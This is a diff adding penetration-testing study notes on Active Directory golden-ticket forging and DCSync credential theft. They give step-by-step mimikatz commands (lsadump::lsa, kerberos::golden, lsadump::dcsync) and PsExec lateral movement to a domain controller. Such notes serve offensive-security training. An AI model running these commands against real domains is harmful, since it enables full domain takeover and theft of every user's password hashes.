@@ -1,0 +1,63 @@
+**in penetration test, this module is not usual due to the risk of incomplete removal**
+
+==============
+golden tickets
+==============
+krbtgt
+	secret key
+	password hash of a domain user account
+	we can create self-made TGTs or golden tickets using this
+	so, HOLD
+
+1. grant access
+	login into the domain admins group user
+	or
+	compromised the DC itself
+
+2. extract the password hash
+	mimikatz.exe
+		# privilege::debug
+		# lsadump::lsa /patch
+		find krbtgt
+3. create golden ticket
+	mimikatz.exe
+		# privilege::debug
+		# kerberos::purge
+		# kerberos::golden /user:<fake username> /domain:<domain> /sid:<sid> /krbtgt:<krbtgt> /ptt
+		ex. # kerberos::golden /user:fakeuser /domain:corp.com /sid:<sid> /krbtgt:<krbtgt> /ptt
+
+4. launch a new command prompt
+	mimikatz.exe
+		# misc::cmd
+
+5. lateral movement to the DC
+	PsExec.exe \\<machine> <shell>
+	ex. PsExec.exe \\dc01 cmd.exe
+	
+6. check
+	whoami
+	whoami /group
+
+** if we use PsExec.exe with ip address instead hostname, it forces the use of NTLM authentication --> blocked**
+
+==================
+DC synchronization
+==================
+steal the password hashes
+other methods
+	1. move laterally to the DC and run mimikatz to dump the password hash of every user
+	2. steal a copy of the NTDS.dit DB file
+		copy of all AD accounts stored on the hard drive
+DC synchronization : abuse AD functionally itself and capture hashes remotely from victim client
+	typically, production environments and domains have more then one DC(provide redundency)
+	DC may request an update for a specific object using api to synchronize each other
+		DC doesn't verify that it came from another known DC
+		it only verifys that the associated SID has the correct privileges.
+	attempt to issue a rogue update request to a DC from domain admins group user
+
+1. grant access
+	login into the domain admins group user
+2. start the replication and get hashes
+	mimikatz.exe
+		# lsadump::dcsync /user:<target user>
+		ex. # lsadump::dcsync /user:Administrator
